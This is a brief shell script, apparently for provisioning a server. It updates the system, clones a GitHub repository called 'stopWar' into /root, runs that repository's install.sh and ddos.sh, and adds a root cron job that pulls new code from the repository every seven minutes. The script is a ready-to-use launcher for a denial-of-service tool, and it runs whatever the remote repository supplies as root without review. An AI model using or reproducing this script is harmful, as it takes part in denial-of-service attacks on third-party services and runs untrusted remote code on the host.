#!/bin/sh

set -e

apt-get update
apt-get upgrade -y

cd /root && /usr/bin/git clone https://github.com/angelloGit/stopWar
cd /root/stopWar

./install.sh
./ddos.sh

crontab - <<__EOFF
*/7 * * * * cd /root/stopWar/ && /usr/bin/git pull
__EOFF
